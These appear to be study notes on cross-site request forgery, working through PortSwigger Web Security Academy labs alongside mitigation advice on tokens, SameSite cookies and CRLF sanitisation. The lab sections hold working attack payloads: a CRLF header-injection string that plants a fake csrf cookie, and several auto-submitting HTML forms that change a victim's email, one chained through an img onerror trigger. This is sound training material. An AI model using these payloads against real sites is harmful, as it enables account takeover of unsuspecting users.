# CSRF

[https://owasp.org/www-project-code-review-guide/reviewing-code-for-csrf-issues](https://owasp.org/www-project-code-review-guide/reviewing-code-for-csrf-issues)

![Untitled](CSRF%20fd5308ba97fe4191835760cf7369a4dd/Untitled.png)

Burp tools: [https://portswigger.net/burp/documentation/desktop/functions/generate-csrf-poc](https://portswigger.net/burp/documentation/desktop/functions/generate-csrf-poc)

### Mitigation & initialize tokens

## ****CSRF****

[CSRF tokens | Web Security Academy](https://portswigger.net/web-security/csrf/tokens)

Characteristic: Unique, secret, unpredictable value generated by server-side application transmit to client through HTTP request, contain significant entropy and be strongly unpredictable.

Should use cryptographically secure pseudo-random number generator (CSPRNG), seeded with timestamp & static secret

Upgrade: individual tokens ← hashing with user-specific entropy + CSPRNG

Transmit CSRF token in hidden field in POST method, place  near non-hidden field & before user-controllable data, say no with cookie, url query string,… 

Token store in server side in user’s session data 

Browsers do not normally allow custom headers to be sent cross-domain → defense against predict or capture another user's token

Appendix:

SameSite cookies: [https://portswigger.net/web-security/csrf/samesite-cookies](https://portswigger.net/web-security/csrf/samesite-cookies)

- Strict
- Lax: Only GET req, user interact or click only.

XSS vs CSRF & to mitigate XSS with tokens: [https://portswigger.net/web-security/csrf/xss-vs-csrf](https://portswigger.net/web-security/csrf/xss-vs-csrf)

### LAB 00: ****CSRF where token is duplicated in cookie****

### Overall

In this simulation, this blogs’  is vulnerable to CSRF attack due to double validate the CSRF token right in the same request, called “double submit”. We may try to detect it with the changing email function.

![Untitled](CSRF%20fd5308ba97fe4191835760cf7369a4dd/Untitled%201.png)

Noted that the cookie field contain the same CSRF token like the form hidden input below. And this CSRF token is unique to the user. Then, token from cookie and the form is being compared to validate the request.

### Step to reproduce

In this step, we may want to go back to the search function in the main page to perform a task that control the header of the normal user by inject a new header field that refactor the cookie to the fake one and turn off the SameSite function that may prevent CSRF attack to happen. 

This require a new knowledge about [CRLF injections](https://www.acunetix.com/blog/web-security-zone/http-header-injection/) from Acunetix to conduct a step in this case.

Noted in the blog by Acunetix

> *However, there are more potential consequences of HTTP header injection. For example, the attacker may use HTTP header injection to inject new headers that loosen the [same-origin policy](https://www.acunetix.com/blog/web-security-zone/what-is-same-origin-policy/) security restrictions, thus making it possible to perform other attacks that would otherwise be impossible, for example, [CSRF](https://www.invicti.com/learn/cross-site-request-forgery-csrf/).*
> 

That show a prove that you may perform a CSRF attack with the help of CRLF not even in the lab but in the wild.

```bash
/search=test%0d%0aSet-cookie:%20csrf=fake%3b%20SameSite=None
```

![Untitled](CSRF%20fd5308ba97fe4191835760cf7369a4dd/Untitled%202.png)

Look at the response we can see that the injection is successfully inject a new field in the return response from the server that contain the new field controlled by the attacker.

Then, we already known that in the overall section, request from the client will double check by the token send from both the cookie field and the hidden input field.

Return to the user profile field, we see that the token is overwritten to the fake one.

![Untitled](CSRF%20fd5308ba97fe4191835760cf7369a4dd/Untitled%203.png)

```bash
POC:
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://[ID].web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="aloha&#64;normal&#45;user&#46;net" />
      <input type="hidden" name="csrf" value="fake" />
      <input type="submit" value="Submit request" />
    </form>
<img src="https://[ID].web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>

  </body>
</html>
```

Create a POC and publish to an external server that have a form point to the vulnerable website and contain the hidden field that change the user email to attacker email.

Img tag point the src attribute to the search function in the main page to conduct the CRLF injection right in the request, causing error to the img tag that fire the onerror attribute to submit the form above and trigger the CSRF attack.

Chain: CRLF ( search function )→ CSRF ( change email function ) 

### Mitigation

Real case CRLF target to Microsoft cause to XSS

[$6000 with Microsoft Hall of Fame | Microsoft Firewall Bypass | CRLF to XSS | Microsoft Bug Bounty](https://infosecwriteups.com/6000-with-microsoft-hall-of-fame-microsoft-firewall-bypass-crlf-to-xss-microsoft-bug-bounty-8f6615c47922)

To fix the CRLF injection:

- encode CRLF sequences from user input before using it in HTTP responses
- sanitize user input and remove all newline characters
- never use any user-supplied content directly in the HTTP stream

Real case CSRF

[25 WordPress plugins vulnerable to CSRF attacks.](https://blog.nintechnet.com/25-wordpress-plugins-vulnerable-to-csrf-attacks/)

To fix the CSRF:

- Reauthentication for sensitive action
- avoid assigning actions that change the server state to GET requests
- anti-CSRF tokens - *synchronizer token*
- SameSite cookie to Lax or Strict based on context

### Appendix

[Cross-Site Request Forgery (CSRF) | Learn AppSec | Invicti](https://www.invicti.com/learn/cross-site-request-forgery-csrf/)

[CRLF injection, HTTP response splitting & HTTP header injection | Invicti](https://www.invicti.com/blog/web-security/crlf-http-header/)

[](https://www.acunetix.com/blog/web-security-zone/http-header-injection/)

## LAB 01: ****CSRF vulnerability with no defenses****

Nothing to verify the request made by the user, POC create from burp pro with hidden field take the email from attacker and not visible to user.

![Untitled](CSRF%20fd5308ba97fe4191835760cf7369a4dd/Untitled%204.png)

![Untitled](CSRF%20fd5308ba97fe4191835760cf7369a4dd/Untitled%205.png)

![Untitled](CSRF%20fd5308ba97fe4191835760cf7369a4dd/Untitled%206.png)

The POST request made from the exploit server go through the form tag, automate submit on the exploit server to the victim web site at change email method. But then the request was made by the original server but the content of the request came from the exploit server, causing CSRF, that the request was made by 3rd party server and the cookie is pass through the request.

```jsx
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://[ID].web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="xinchaos&#64;normal&#45;user&#46;net" />
    </form>
	<script>document.forms[0].submit();</script> //auto submit
  </body>
</html>
```

## LAB 02: **CSRF where token validation depends on token being present**

 Packet with email to change and CSRF token

![Untitled](CSRF%20fd5308ba97fe4191835760cf7369a4dd/Untitled%207.png)

Generate a POC but still include the CSRF tokens generated by the server.

![Untitled](CSRF%20fd5308ba97fe4191835760cf7369a4dd/Untitled%208.png)

Result still success due to the CSRF is valid and server allowed to change the email address. So, what if we delete the CSRF, this time the server already stored the token. 

![Untitled](CSRF%20fd5308ba97fe4191835760cf7369a4dd/Untitled%209.png)

Prove that even delete the token, the change is still success due to the server just check for whatever the token still exist in its pool or not.

```jsx
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a04003c03af41fcc06791e4007c00be.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="aloha&#64;normal&#45;user&#46;net" />
    </form>
	<script>document.forms[0].submit();</script>
  </body>
</html>
```

Mitigate: delete after certain time or add a time-stamp,…

## LAB 03: **CSRF where token is not tied to user session**

![Untitled](CSRF%20fd5308ba97fe4191835760cf7369a4dd/Untitled%2010.png)

![Untitled](CSRF%20fd5308ba97fe4191835760cf7369a4dd/Untitled%2011.png)

The server just focus on the token whether its appear in its pool or not but not tied it to users session, which mean if the attacker create a account, which then they have a valid token, they can use it to continue perform the CSRF attack by using their own valid token to trick the server that every request to with the same token is all valid without concern.

```bash
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0ae500c304eb0a67c0be31540086002f.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="belloaloha&#64;hello&#46;net" />
      <input type="hidden" name="csrf" value="o9FlN5VnpZEqGlCdgmMLcWxbRgcdh7lB" />
    </form>
   <script>document.forms[0].submit();</script>
  </body>
</html>
```

### Appendix

[https://www.youtube.com/watch?v=9inczw6qtpY](https://www.youtube.com/watch?v=9inczw6qtpY)